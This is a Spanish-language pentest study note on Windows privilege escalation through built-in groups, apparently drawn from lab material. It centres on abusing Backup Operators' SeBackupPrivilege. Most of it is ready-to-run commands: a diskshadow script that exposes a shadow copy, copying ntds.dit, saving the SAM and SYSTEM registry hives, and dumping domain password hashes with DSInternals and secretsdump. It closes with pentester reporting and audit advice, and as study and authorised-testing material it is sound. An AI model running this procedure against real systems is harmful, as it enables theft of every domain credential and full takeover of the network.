# Windows Privilege Escalation: Built-in Groups

## Resumen

Windows incluye varios grupos integrados con privilegios especiales, sobre todo en servidores y controladores de dominio. Algunos de estos grupos pueden usarse para escalar privilegios si se compromete una cuenta miembro. Esta nota resume los principales grupos y el uso del privilegio **SeBackupPrivilege** para acceder a archivos protegidos como `ntds.dit`, `SAM` y `SYSTEM`.

## Grupos integrados relevantes

- **Backup Operators**
- **Event Log Readers**
- **DnsAdmins**
- **Hyper-V Administrators** *(desde Server 2012)*
- **Print Operators**
- **Server Operators**

> Es importante auditar la membresía de estos grupos y verificar si hay cuentas con acceso innecesario o excesivo.

## Backup Operators y SeBackupPrivilege

- **Permisos otorgados**: `SeBackupPrivilege` y `SeRestorePrivilege`
- Permite **leer cualquier archivo del sistema**, ignorando las ACLs (listas de control de acceso).
- No se puede usar `copy` directamente. Se necesita usar librerías con `FILE_FLAG_BACKUP_SEMANTICS`.

### Activación de privilegios en PowerShell:

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Get-SeBackupPrivilege
Set-SeBackupPrivilege
```

### Verificación del privilegio:

```powershell
whoami /priv
```

### Ejemplo: copiar archivo protegido

```powershell
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
```

## Ataque a un Domain Controller (DC)

### Objetivo: copiar `ntds.dit` usando shadow copy

```powershell
diskshadow.exe
> set verbose on
> set metadata C:\Windows\Temp\meta.cab
> set context clientaccessible
> begin backup
> add volume C: alias cdrive
> create
> expose %cdrive% E:
> end backup
exit
```

Ahora el volumen `E:` contiene una copia de la partición `C:`.

### Copiar `ntds.dit`

```powershell
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

### Copiar hives del registro

```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```

> ⚠️ Si hay una entrada explícita de denegación en la ACL para el usuario, ni `SeBackupPrivilege` permitirá acceder.

## Extracción de hashes

### Usando DSInternals:

```powershell
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```

### Usando Impacket secretsdump:

```bash
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

## Alternativa con Robocopy (sin recursos externos)

Robocopy permite copiar archivos usando modo backup (`/B`).

```cmd
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

## Recomendaciones para el pentester

- Siempre revisar la membresía de los grupos privilegiados.
- Documentar qué cuentas tienen `SeBackupPrivilege` habilitado.
- Si se explota el privilegio, dejar constancia detallada de:
  - Qué archivos se accedieron (ej: `ntds.dit`, `SAM`, `SYSTEM`).
  - Qué hashes se extrajeron.
  - Qué herramientas se usaron (`DSInternals`, `secretsdump.py`, etc.).
- Sugerir eliminación de membresías innecesarias y mejoras en políticas de contraseñas.

